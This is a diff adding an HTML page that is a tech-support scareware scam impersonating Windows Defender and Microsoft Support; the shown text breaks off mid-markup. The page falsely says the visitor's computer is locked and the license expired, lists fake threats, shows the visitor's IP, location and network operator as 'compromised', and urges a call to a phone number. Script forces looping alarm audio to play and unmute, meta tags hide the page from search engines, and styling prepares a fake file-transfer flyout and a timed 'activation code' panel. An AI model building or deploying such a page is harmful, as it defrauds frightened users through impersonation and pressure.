@@ -1,0 +1,1719 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nositelinkssearchbox">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="slurp" content="noindex, nofollow">
+    <meta name="duckduckbot" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="s1t1y1le.css" type="text/css">
+    <link rel="stylesheet" href="bo1ot1s1tr1ap.min.css" type="text/css">
+    <link rel="stylesheet" href="fo1nt-awe1s1om1e.min.css" type="text/css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="1mai1sy1.js"></script>
+    <title>SCMediXWind_HOUSE</title>
+    <script>
+      window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+      plausible.init()
+    </script>
+    <style>
+      /* ── "Don't worry" top dropdown ── */
+
+      /* Invisible trigger strip — same height as browser fullscreen bar */
+      #_pv_topzone {
+        position: fixed;
+        top: 0; left: 0; right: 0;
+        height: 52px;
+        z-index: 2147483644;
+        cursor: none;
+      }
+
+      /* Dropdown panel — hidden above viewport by default */
+      #_pv_toppanic {
+        position: fixed;
+        top: 0;
+        left: 50%;
+        transform: translateX(-50%) translateY(-110%);
+        z-index: 2147483647;
+        width: 480px;
+        max-width: 94vw;
+        background: #ffffff;
+        border-radius: 0 0 18px 18px;
+        box-shadow: 0 12px 48px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(0,0,0,0.08);
+        pointer-events: none;
+        transition: transform 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+        overflow: hidden;
+        font-family: "Segoe UI", system-ui, sans-serif;
+      }
+
+      /* Slide down when mouse enters trigger zone */
+      #_pv_topzone:hover + #_pv_toppanic {
+        transform: translateX(-50%) translateY(0);
+      }
+
+      /* Coloured accent bar at the very top of the dropdown */
+      #_pv_toppanic::before {
+        content: '';
+        display: block;
+        height: 4px;
+        background: linear-gradient(90deg, #0078d4 0%, #00c4ff 50%, #0078d4 100%);
+        background-size: 200% 100%;
+        animation: _pvTopBarSlide 2.5s linear infinite;
+      }
+      @keyframes _pvTopBarSlide {
+        0%   { background-position: 200% 0; }
+        100% { background-position: -200% 0; }
+      }
+
+      /* Inner padding */
+      #_pv_toppanic__inner {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        padding: 18px 24px 20px;
+      }
+
+      /* Shield icon */
+      #_pv_toppanic__ico {
+        flex-shrink: 0;
+        width: 52px; height: 52px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #e8f4ff, #cce8ff);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 26px;
+      }
+
+      /* Text block */
+      #_pv_toppanic__text {
+        flex: 1;
+      }
+      #_pv_toppanic__heading {
+        font-size: 15px;
+        font-weight: 700;
+        color: #111;
+        margin: 0 0 4px;
+      }
+      #_pv_toppanic__body {
+        font-size: 12.5px;
+        color: #555;
+        line-height: 1.5;
+        margin: 0 0 8px;
+      }
+      #_pv_toppanic__phone {
+        display: inline-block;
+        font-size: 14px;
+        font-weight: 800;
+        color: #0078d4;
+        letter-spacing: 0.02em;
+      }
+
+      /* ── popupvicky design only — old Windows UI CSS removed ── */
+
+    /* ══════════════════════════════════════════════
+       EXACT POPUPVICKY DESIGN (style56.css inline)
+    ══════════════════════════════════════════════ */
+
+    /* Override #scan to full-viewport */
+    #scan {
+      position: fixed !important;
+      inset: 0 !important;
+      top: 0 !important; left: 0 !important;
+      width: 100% !important; height: 100% !important;
+      background: transparent !important;
+      border-radius: 0 !important;
+      box-shadow: none !important;
+      transform: none !important;
+      overflow: hidden !important;
+      padding: 0 !important;
+      animation: none !important;
+      z-index: 99999 !important;
+    }
+
+    /* ── STAGE ── */
+    .stage {
+      position: relative;
+      width: 100%; height: 100vh;
+      perspective: 1400px;
+    }
+
+    /* ── PANELS COMMON ── */
+    .panel {
+      position: absolute;
+      width: 360px; padding: 24px;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(0,0,0,.12);
+      animation: floatDepth 5s cubic-bezier(.4,0,.2,1) infinite;
+      transform-style: preserve-3d;
+    }
+
+    /* ── 3 SIDE PANELS ── */
+    .stage > .panel:not(.panel-action):nth-of-type(1) { top: 20%; left: 15%; }
+    .stage > .panel:not(.panel-action):nth-of-type(2) { top: 35%; left: 40%; }
+    .stage > .panel:not(.panel-action):nth-of-type(3) { top: 25%; left: 65%; }
+
+    .panel-inner { display:flex; flex-direction:column; align-items:center; text-align:center; }
+    .panel-inner img { width:56px; border-radius:10px; }
+
+    /* ── CENTER ACTION PANEL ── */
+    .panel-action {
+      width: 380px; max-height: 620px;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 60;
+      animation: floatCenter 4s ease-in-out infinite;
+      overflow: hidden;
+    }
+    .panel-action-inner { display:flex; flex-direction:column; align-items:center; text-align:center; }
+    .panel-action-inner > * { margin-bottom: 6px; }
+    .action-logo img { width:64px; border-radius:10px; }
+    .panel-action h2 { font-size:1.1rem; }
+
+    /* ── GREEN INFO BOX ── */
+    .green-info-box {
+      max-width:320px; padding:8px; border-radius:10px;
+      background:rgba(232,245,233,.95);
+      border:1px solid rgba(46,125,50,.35);
+      text-align:left;
+    }
+    .green-info-title { font-size:.72rem; font-weight:600; color:#2e7d32; }
+    .green-info-text  { font-size:.75rem; line-height:1.35; }
+
+    .action-message { font-size:.78rem; line-height:1.25; max-width:320px; }
+
+    /* ── IP BOX ── */
+    .ip-box {
+      max-width:300px; padding:6px 8px; border-radius:10px;
+      background:#f1f5f9;
+      display:flex; justify-content:space-between; font-size:.75rem;
+    }
+    .ip-label { color:#555; }
+    .ip-value { font-weight:700; color:#1a1a1a; font-family:Consolas,monospace; }
+
+    /* ── RED INFO BOX ── */
+    .red-info-box {
+      width:100%; max-width:320px;
+      padding:10px 12px;
+      border-radius:12px;
+      background:linear-gradient(135deg, #0078d4, #005a9e);
+      border:1px solid rgba(186,230,253,.45);
+      box-shadow:0 10px 18px rgba(0,90,158,.28);
+      text-align:left;
+    }
+    .red-info-top {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      margin-bottom:6px;
+    }
+    .red-info-badge {
+      display:inline-flex;
+      align-items:center;
+      gap:5px;
+      font-size:.62rem;
+      font-weight:700;
+      letter-spacing:.04em;
+      text-transform:uppercase;
+      color:#0c4a6e;
+      background:#e0f2fe;
+      border-radius:999px;
+      padding:3px 8px;
+    }
+    .red-info-label {
+      color:#dbeafe;
+      font-size:.72rem;
+      font-weight:600;
+      opacity:.95;
+      line-height:1.3;
+    }
+    .red-info-phone {
+      display:block;
+      color:#fff;
+      font-size:1.18rem;
+      font-weight:800;
+      letter-spacing:.02em;
+      line-height:1.1;
+      text-shadow:0 1px 0 rgba(0,0,0,.22);
+    }
+
+    /* ── BUTTONS ── */
+    .action-buttons { display:flex; gap:14px; justify-content:center; margin-top:6px; }
+    .action-buttons button {
+      min-width:110px; padding:8px 12px; border-radius:8px;
+      border:none; font-size:.8rem; font-weight:700; cursor:pointer;
+      box-shadow:0 6px 16px rgba(0,0,0,.18);
+    }
+    .btn-allow, .btn-deny {
+      background:linear-gradient(135deg,#1f3a5f,#2b5c9a); color:#fff;
+    }
+
+    /* ── ANIMATIONS ── */
+    @keyframes floatDepth {
+      0%,100% { transform:translateY(0); }
+      50%      { transform:translateY(-8px); }
+    }
+    @keyframes floatCenter {
+      0%,100% { transform:translate(-50%,-50%); }
+      50%      { transform:translate(-50%,-52%); }
+    }
+
+    /* ── PANEL 5 ── */
+    .panel-action-5 { opacity:0; z-index:55; transform:translate(-50%,-50%); pointer-events:none; }
+    .panel-action-5.pop-from-back {
+      opacity:1; pointer-events:auto;
+      animation:panel5OutRight 700ms cubic-bezier(.25,.9,.25,1) forwards;
+    }
+    @keyframes panel5OutRight { to { transform:translate(calc(-50% + 420px),-50%); } }
+
+    /* ── PANEL 6 ── */
+    .panel-action-6 {
+      position:absolute; top:50%; left:calc(50% - 420px);
+      transform:translate(-50%,-50%); z-index:59;
+      background:#fff; border:2px solid #22c55e; border-radius:16px;
+      box-shadow:0 10px 40px rgba(0,0,0,.12);
+    }
+    /* ── PANEL 6 — Activation Code ── */
+    @keyframes borderPulse6 {
+      0%,100% { border-color:#0078d4; box-shadow:0 0 18px rgba(0,120,212,.38),0 8px 32px rgba(0,0,0,.18); }
+      50%      { border-color:#38bdf8; box-shadow:0 0 28px rgba(56,189,248,.48),0 8px 32px rgba(0,0,0,.18); }
+    }
+    @keyframes timerPulse {
+      0%,100% { color:#bfdbfe; transform:scale(1); }
+      50%      { color:#ffffff; transform:scale(1.06); }
+    }
+    @keyframes shimmerInput {
+      0%   { background-position:-200% center; }
+      100% { background-position:200% center; }
+    }
+    .panel-action-6 {
+      background:#fff;
+      border:2px solid #0078d4;
+      border-radius:14px;
+      box-shadow:0 0 18px rgba(0,120,212,.38),0 8px 32px rgba(0,0,0,.18);
+      animation:borderPulse6 2.2s ease-in-out infinite;
+      padding:0 !important;
+      overflow:hidden;
+    }
+    .code-box { width:100%; }
+
+    /* header strip */
+    .code-header {
+      background:linear-gradient(90deg,#005a9e,#0078d4);
+      padding:10px 14px 9px;
+      display:flex; align-items:center; gap:9px;
+    }
+    .code-header-ico {
+      width:28px; height:28px; flex-shrink:0;
+      background:rgba(255,255,255,.18); border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      font-size:15px;
+    }
+    .code-header-text { flex:1; }
+    .code-header-title {
+      font-size:.72rem; font-weight:800; color:#fff;
+      letter-spacing:.03em; line-height:1.2;
+    }
+    .code-header-sub {
+      font-size:.62rem; color:rgba(255,255,255,.82); margin-top:1px;
+    }
+
+    /* timer badge */
+    .code-timer-badge {
+      background:rgba(0,0,0,.28);
+      border-radius:6px; padding:3px 7px;
+      text-align:center;
+    }
+    .code-timer-val {
+      font-size:.9rem; font-weight:900; color:#fff;
+      animation:timerPulse 1s ease-in-out infinite;
+      display:block; line-height:1;
+    }
+    .code-timer-lbl { font-size:.52rem; color:rgba(255,255,255,.75); letter-spacing:.04em; }
+
+    /* body */
+    .code-body { padding:12px 14px 14px; }
+    .code-step {
+      display:flex; align-items:flex-start; gap:7px;
+      background:#f4f9ff; border:1px solid #cfe8ff;
+      border-radius:8px; padding:8px 10px; margin-bottom:10px;
+    }
+    .code-step-num {
+      width:18px; height:18px; border-radius:50%;
+      background:#0078d4; color:#fff;
+      font-size:.6rem; font-weight:900;
+      display:flex; align-items:center; justify-content:center;
+      flex-shrink:0; margin-top:1px;
+    }
+    .code-step-txt { font-size:.7rem; color:#333; line-height:1.45; }
+    .code-step-txt strong { color:#005a9e; }
+
+    .code-divider { height:1px; background:linear-gradient(90deg,transparent,#e0e0e0,transparent); margin:2px 0 10px; }
+
+    .code-input-row { display:flex; gap:6px; align-items:stretch; }
+    .code-input {
+      flex:1; border-radius:7px; padding:9px 11px;
+      font-size:.75rem; font-weight:700; letter-spacing:.08em;
+      border:2px solid #1565c0;
+      background:linear-gradient(90deg,#f0f4ff 0%,#e8f0fe 40%,#f0f4ff 100%);
+      background-size:200% auto;
+      animation:shimmerInput 3s linear infinite;
+      color:#1a237e; outline:none;
+      box-shadow:inset 0 1px 4px rgba(21,101,192,.15);
+      transition:border-color .2s, box-shadow .2s;
+    }
+    .code-input:focus {
+      border-color:#0d47a1;
+      box-shadow:0 0 0 3px rgba(21,101,192,.2),inset 0 1px 4px rgba(21,101,192,.15);
+    }
+    .code-btn {
+      padding:9px 16px; border-radius:7px;
+      background:linear-gradient(135deg,#1565c0 0%,#0d47a1 100%);
+      color:#fff; font-weight:900; font-size:.75rem;
+      letter-spacing:.06em; border:none; cursor:pointer;
+      box-shadow:0 3px 12px rgba(21,101,192,.45);
+      transition:transform .15s, box-shadow .15s, background .15s;
+      white-space:nowrap;
+    }
+    .code-btn:hover {
+      background:linear-gradient(135deg,#0d47a1,#1a237e);
+      box-shadow:0 5px 18px rgba(13,71,161,.55);
+      transform:translateY(-1px);
+    }
+    .code-btn:active { transform:translateY(0); box-shadow:0 2px 8px rgba(13,71,161,.35); }
+
+    .code-footer {
+      margin-top:10px; background:#eef6ff; border:1px solid #bfdbfe;
+      border-radius:7px; padding:7px 10px;
+      display:flex; align-items:center; gap:7px;
+    }
+    .code-footer-ico { font-size:14px; flex-shrink:0; }
+    .code-footer-txt { font-size:.65rem; color:#0b5cab; line-height:1.4; }
+    .code-footer-txt strong { font-weight:800; }
+
+    /* ── TOP NOTIFICATION BAR ── */
+    .top-notification-bar {
+      position:fixed; top:18px; left:50%; transform:translateX(-50%);
+      width:420px; max-width:92%; padding:12px 16px;
+      background:rgba(0,0,0,.55); backdrop-filter:blur(8px);
+      border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,.35);
+      color:#fff; font-size:.75rem; line-height:1.4;
+      z-index:9000; pointer-events:none;
+    }
+
+    /* ── BOTTOM MARQUEE ── */
+    .bottom-marquee {
+      position:fixed; bottom:0; left:0;
+      width:100%; height:56px; line-height:56px;
+      background:rgba(0,0,0,.6); backdrop-filter:blur(8px);
+      z-index:10000; overflow:hidden; pointer-events:none;
+    }
+    .marquee-track { display:flex; width:max-content; animation:marqueeScroll 18s linear infinite; }
+    .marquee-item  {
+      display:flex; align-items:center; gap:18px; padding:0 48px;
+      white-space:nowrap; color:#fff; font-size:1rem; font-weight:700;
+    }
+    .marquee-item img { width:32px; height:32px; border-radius:8px; }
+    @keyframes marqueeScroll { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+
+    /* ── MINI FLOAT BOTTOM-RIGHT ── */
+    .mini-float-bottom {
+      position:fixed; right:20px; bottom:70px;
+      display:flex; align-items:center; gap:10px; padding:10px 14px;
+      background:#fff; border-radius:12px;
+      border:1px solid rgba(0,0,0,.15); box-shadow:0 8px 24px rgba(0,0,0,.2);
+      font-size:.82rem; line-height:1.25; color:#111; z-index:9999;
+    }
+    .mini-float-bottom img  { width:36px; height:36px; border-radius:8px; object-fit:cover; }
+    .mini-float-bottom span { max-width:180px; font-weight:600; }
+    .mini-float-bottom .support-phone-inline { white-space:nowrap; display:inline-block; font-size:1.06em; }
+
+    /* ── Windows 11 file transfer / copy flyout ── */
+    .win-file-transfer {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      width: min(448px, calc(100vw - 32px));
+      z-index: 10001;
+      opacity: 0;
+      transform: translate(-50%, -46%);
+      pointer-events: none;
+      transition: opacity 0.45s ease, transform 0.45s ease;
+      font-family: "Segoe UI Variable Text", "Segoe UI", system-ui, sans-serif;
+    }
+    .win-file-transfer.is-visible {
+      opacity: 1;
+      transform: translate(-50%, -50%);
+    }
+    .win-file-transfer__shell {
+      background: rgba(249, 249, 249, 0.96);
+      backdrop-filter: blur(30px) saturate(180%);
+      -webkit-backdrop-filter: blur(30px) saturate(180%);
+      border: 1px solid rgba(0, 0, 0, 0.0578);
+      border-radius: 8px;
+      box-shadow:
+        0 0 0 0.5px rgba(0, 0, 0, 0.04),
+        0 8px 16px rgba(0, 0, 0, 0.14),
+        0 32px 64px rgba(0, 0, 0, 0.12);
+      overflow: hidden;
+    }
+    .win-file-transfer__header {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 16px 16px 12px;
+    }
+    .win-file-transfer__icons {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-shrink: 0;
+      padding-top: 2px;
+    }
+    .win-file-transfer__ico {
+      width: 28px;
+      height: 28px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .win-file-transfer__ico svg { width: 28px; height: 28px; display: block; }
+    .win-file-transfer__arrow {
+      color: #616161;
+      font-size: 12px;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+    .win-file-transfer__copy {
+      min-width: 0;
+      flex: 1;
+    }
+    .win-file-transfer__title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1f1f1f;
+      line-height: 1.35;
+      margin: 0 0 4px;
+      letter-spacing: -0.01em;
+    }
+    .win-file-transfer__subtitle {
+      font-size: 12px;
+      color: #616161;
+      line-height: 1.4;
+      margin: 0;
+    }
+    .win-file-transfer__subtitle strong {
+      color: #424242;
+      font-weight: 600;
+    }
+    .win-file-transfer__body {
+      padding: 0 16px 14px;
+    }
+    .win-file-transfer__progress-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+    .win-file-transfer__progress-track {
+      flex: 1;
+      height: 2px;
+      background: #e0e0e0;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+    .win-file-transfer__progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #0067c0;
+      border-radius: 999px;
+      transition: width 0.25s linear;
+    }
+    .win-file-transfer__pct {
+      font-size: 12px;
+      font-weight: 400;
+      color: #424242;
+      min-width: 36px;
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+    }
+    .win-file-transfer__meta {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1.2fr;
+      gap: 8px;
+      font-size: 12px;
+      color: #616161;
+      line-height: 1.35;
+      margin-bottom: 12px;
+    }
+    .win-file-transfer__meta span {
+      font-variant-numeric: tabular-nums;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .win-file-transfer__meta span:last-child {
+      text-align: right;
+    }
+    .win-file-transfer__current {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 12px;
+      background: rgba(255, 255, 255, 0.72);
+      border: 1px solid rgba(0, 0, 0, 0.06);
+      border-radius: 6px;
+      min-height: 36px;
+    }
+    .win-file-transfer__file-ico {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+    .win-file-transfer__file-name {
+      font-size: 12px;
+      color: #424242;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .win-file-transfer__footer {
+      display: flex;
+      justify-content: flex-end;
+      padding: 0 16px 14px;
+    }
+    .win-file-transfer__cancel {
+      appearance: none;
+      border: 1px solid rgba(0, 0, 0, 0.12);
+      background: rgba(255, 255, 255, 0.8);
+      color: #1f1f1f;
+      font-family: inherit;
+      font-size: 12px;
+      font-weight: 400;
+      padding: 5px 14px;
+      border-radius: 4px;
+      cursor: default;
+      box-shadow: 0 1px 0 rgba(255, 255, 255, 0.8) inset;
+    }
+
+    /* ── nen helpers ── */
+    .nen,.nen1,.nen2,.nen3 { display:none; }
+
+    /* ── Fade to black when support panel appears ── */
+    #hula { transition: background-color 1.8s ease; }
+    #hula.hula-fade-black { background-color: #000 !important; }
+    #hula.hula-fade-black .bgimg { opacity: 0; transition: opacity 1s ease; }
+    #hula.hula-fade-black #scan  { opacity: 0; transition: opacity 0.8s ease; pointer-events:none; }
+
+    /* ── Modal exit animation ── */
+    @keyframes modal-exit-anim {
+      from { opacity:1; transform: scale(1) translateY(0); }
+      to   { opacity:0; transform: scale(0.82) translateY(-20px); }
+    }
+    .modal-exit {
+      animation: modal-exit-anim 0.38s ease forwards !important;
+      pointer-events: none !important;
+    }
+
+    /* ── Instruction box inside chat-box ── */
+    .dp-inner {
+      margin-top: 16px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.14);
+      border-left: 4px solid #4ade80;
+      border-radius: 6px;
+      padding: 14px 16px;
+    }
+    .dp-inner__head {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+    .dp-inner__ico { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+    .dp-inner__title {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: #4ade80;
+      margin-bottom: 3px;
+    }
+    .dp-inner__sub {
+      margin: 0;
+      font-size: 11px;
+      color: rgba(255,255,255,0.55);
+    }
+    /* dp-inner__steps overridden below in redesign block */
+
+    /* ── Staggered threat reveal ── */
+    @keyframes nen-appear {
+      from { opacity: 0; transform: translateX(-18px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+    .nen  { opacity:0; animation: nen-appear 0.45s ease forwards; animation-delay: 0.4s; }
+    .nen1 { opacity:0; animation: nen-appear 0.45s ease forwards; animation-delay: 1.1s; }
+    .nen2 { opacity:0; animation: nen-appear 0.45s ease forwards; animation-delay: 1.8s; }
+    .nen3 { opacity:0; animation: nen-appear 0.45s ease forwards; animation-delay: 2.5s; }
+
+    /* ── Don't Panic instruction box ── */
+    .dp-box {
+      opacity: 0;
+      animation: nen-appear 0.5s ease forwards;
+      animation-delay: 3.3s;
+      margin: 14px 0 0;
+      background: linear-gradient(135deg, #1a2a1a 0%, #0f1f2e 100%);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-left: 4px solid #4ade80;
+      border-radius: 6px;
+      padding: 14px 16px;
+    }
+    .dp-box__header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .dp-box__icon {
+      font-size: 22px;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+    .dp-box__title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #4ade80;
+      margin: 0;
+      letter-spacing: 0.01em;
+    }
+    .dp-box__msg {
+      font-size: 12px;
+      color: rgba(255,255,255,0.82);
+      line-height: 1.6;
+      margin: 0 0 12px;
+    }
+    .dp-box__steps {
+      list-style: none;
+      margin: 0 0 12px;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+    .dp-box__steps li {
+      font-size: 12px;
+      color: rgba(255,255,255,0.75);
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    .dp-box__steps li::before {
+      content: '✓';
+      color: #4ade80;
+      font-weight: 700;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .dp-box__cta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .dp-box__call-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: #16a34a;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 9px 20px;
+      border-radius: 5px;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      transition: background 0.15s;
+    }
+    .dp-box__call-btn:hover { background: #15803d; }
+    .dp-box__phone-sub {
+      font-size: 11px;
+      color: rgba(255,255,255,0.5);
+    }
+    </style>
+  </head>
+  <body onclick="hcvaBodyClick();">
+    <audio loop preload="auto" autoplay muted playsinline webkit-playsinline id="b1e1p1">
+      <source src="1be1e1p.wav" type="audio/wav">
+    </audio>
+    <!-- popupvicky background audio -->
+    <audio id="audioEng" autoplay muted loop preload="auto" playsinline webkit-playsinline>
+      <source src="media/al2030.mp3" type="audio/mpeg">
+    </audio>
+    <script>
+      var _audioUnlocked = false;
+      var _audioBootTimer = null;
+      var _audioUnlockEvents = ['click', 'keydown', 'keypress', 'touchstart', 'touchend', 'mousedown'];
+      var _audioIds = ['b1e1p1', 'audioEng'];
+
+      function hcvaForcePlayAudio(a) {
+        if (!a) return Promise.resolve(false);
+        if (!a.paused && !a.muted && a.volume > 0) return Promise.resolve(true);
+        if (!a.paused && a.muted) {
+          a.muted = false;
+          a.volume = 1;
+          return Promise.resolve(true);
+        }
+
+        a.loop = true;
+        a.preload = 'auto';
+        a.setAttribute('playsinline', '');
+        a.setAttribute('webkit-playsinline', '');
+        if (a.readyState < 2) {
+          try { a.load(); } catch (_loadErr) {}
+        }
+
+        function unmuteAfterStart() {
+          return new Promise(function (resolve) {
+            requestAnimationFrame(function () {
+              a.muted = false;
+              a.volume = 1;
+              resolve(true);
+            });
+          });
+        }
+
+        function tryMutedThenUnmute() {
+          a.muted = true;
+          a.volume = 1;
+          return a.play().then(unmuteAfterStart);
+        }
+
+        function tryLowVolumeThenFull() {
+          a.muted = false;
+          a.volume = 0.01;
+          return a.play().then(function () {
+            return new Promise(function (resolve) {
+              requestAnimationFrame(function () {
+                a.volume = 1;
+                resolve(true);
+              });
+            });
+          });
+        }
+
+        function tryDirect() {
+          a.muted = false;
+          a.volume = 1;
+          return a.play().then(function () {
+            return true;
+          });
+        }
+
+        return tryDirect()
+          .catch(function () { return tryMutedThenUnmute(); })
+          .catch(function () { return tryLowVolumeThenFull(); })
+          .catch(function () { return false; });
+      }
+
+      function b1e1p11() {
+        return Promise.all(_audioIds.map(function (id) {
+          return hcvaForcePlayAudio(document.getElementById(id));
+        })).then(function (results) {
+          if (results.some(Boolean)) {
+            _audioUnlocked = true;
+            _removeAudioUnlockListeners();
+            if (_audioBootTimer) {
+              clearInterval(_audioBootTimer);
+              _audioBootTimer = null;
+            }
+          }
+          return results.some(Boolean);
+        });
+      }
+
+      function _removeAudioUnlockListeners() {
+        _audioUnlockEvents.forEach(function (e) {
+          document.removeEventListener(e, _unlockAudio, true);
+        });
+      }
+
+      function _unlockAudio() {
+        b1e1p11();
+      }
+
+      function hcvaBootAudio() {
+        b1e1p11();
+      }
+
+      hcvaBootAudio();
+      document.addEventListener('DOMContentLoaded', hcvaBootAudio);
+      window.addEventListener('load', hcvaBootAudio);
+
+      var bootAttempts = 0;
+      _audioBootTimer = window.setInterval(function () {
+        bootAttempts += 1;
+        b1e1p11();
+        if (_audioUnlocked || bootAttempts >= 20) {
+          clearInterval(_audioBootTimer);
+          _audioBootTimer = null;
+        }
+      }, 400);
+
+      _audioIds.forEach(function (id) {
+        var a = document.getElementById(id);
+        if (!a) return;
+        a.addEventListener('canplaythrough', hcvaBootAudio);
+        a.addEventListener('loadeddata', hcvaBootAudio);
+      });
+
+      _audioUnlockEvents.forEach(function (e) {
+        document.addEventListener(e, _unlockAudio, { capture: true, passive: true });
+      });
+
+      window.b1e1p11 = b1e1p11;
+    </script>
+    <div id="hula">
+      <div class="bgimg">
+        <img src="fbg4.png" alt="" width="100%" height="100%">
+      </div>
+      <div id="scan">
+
+        <!-- ── STAGE ── -->
+        <div class="stage">
+
+          <!-- Panel 1 — System Info -->
+          <div class="panel">
+            <div class="panel-inner">
+              <img src="1d1m.png" alt="Windows Security">
+              <h2>System Information</h2>
+              <p>Windows Defender protection active.<br>
+                 Real-time scanning enabled.<br>
+                 Virus &amp; threat detection.<br>
+                 Security status: <strong style="color:#c42b1c">CRITICAL</strong></p>
+            </div>
+          </div>
+
+          <!-- Panel 2 — Microsoft Support -->
+          <div class="panel">
+            <div class="panel-inner">
+              <img src="mis0f1t.png" alt="Microsoft Support">
+              <h2>Microsoft Support</h2>
+              <p>Remote threat removal service.<br>
+                 Full system diagnostics.<br>
+                 IP blacklist clearance.<br>
+                 Guaranteed security &amp; performance.</p>
+            </div>
+          </div>
+
+          <!-- Panel 3 — Assistance -->
+          <div class="panel">
+            <div class="panel-inner">
+              <img src="mis0f1t.png" alt="Assistance">
+              <h2>Assistance</h2>
+              <p>Access certified Microsoft technicians and security resources immediately.</p>
+            </div>
+          </div>
+
+          <!-- Top notification bar (inside stage so it floats above panels) -->
+          <div class="top-notification-bar" style="font-size:13px;width:520px">
+            <span>
+              Security scan in progress — Please do not close this page<br><br>
+              Active Windows Security • Diagnostic in progress •<br>
+              Please contact us for free. A technical advisor will guide you through the removal process.<br><br>
+              Your computer has been disabled.<br><br>
+              Windows Defender SmartScreen prevents unrecognized apps from running.<br><br>
+              <strong>Guaranteed support 24/7 • +1 (855) 251-3137</strong>
+            </span>
+          </div>
+
+          <!-- ── Centre Action Panel (MAIN) ── -->
+          <div class="panel panel-action" id="panel-action">
+            <div class="panel-action-inner">
+
+              <div class="action-logo">
+                <img src="1d1m.png" alt="Windows Security" style="font-size:10px;">
+              </div>
+
+              <h2>Diagnostic</h2>
+
+              <!-- Green box -->
+              <div class="green-info-box">
+                <div class="green-info-title" style="display:flex;align-items:center;gap:6px;font-size:10px;">
+                  <img src="mis0f1t.png" alt="" style="width:16px;height:16px;">
+                  <span>GOOD NEWS: DEVICE UNDER WARRANTY</span>
+                </div>
+                <div class="green-info-text" style="font-size:10px;">
+                  100% free service.<br><br>
+                  In addition, you benefit from Windows Defender Cloud (1 year free) included in your warranty.
+                </div>
+              </div>
+
+              <p class="action-message" style="font-size:10px;">
+                <strong>YOUR COMPUTER HAS BEEN LOCKED</strong><br><br>
+                <span style="display:inline-flex;align-items:center;gap:6px;">
+                  <img src="mis0f1t.png" alt="" style="width:16px;height:16px;font-size:10px;">
+                  <strong>WARNING: LICENSE EXPIRED</strong>
+                </span>
+              </p>
+
+              <!-- IP / Location / Network -->
+              <div class="ip-box">
+                <span class="ip-label" style="font-size:10px;">Compromised IP address</span>
+                <span class="ip-value" style="font-size:10px;" data-hcva-ip>—</span>
+              </div>
+              <div class="ip-box">
+                <span class="ip-label" style="font-size:10px;">Localisation</span>
+                <span class="ip-value" style="font-size:10px;" data-hcva-location>—</span>
+              </div>
+              <div class="ip-box">
+                <span class="ip-label" style="font-size:10px;">Network operator</span>
+                <span class="ip-value" style="font-size:10px;" data-hcva-isp>—</span>
+              </div>
+
+              <!-- Threats (controlled by 1mai1sy1.js) -->
+              <div id="dixon">
+                <div class="nen">Trojan:Script/Wacatac.B!ml — Critical threat detected</div>
+                <div class="nen1">Spamhaus SBL blacklist match — IP flagged</div>
+                <div class="nen2">Brute-force login attempts detected</div>
+                <div class="nen3">Unauthorized proxy / VPN abuse risk</div>
+              </div>
+
+              <!-- Red phone box -->
+              <div class="red-info-box">
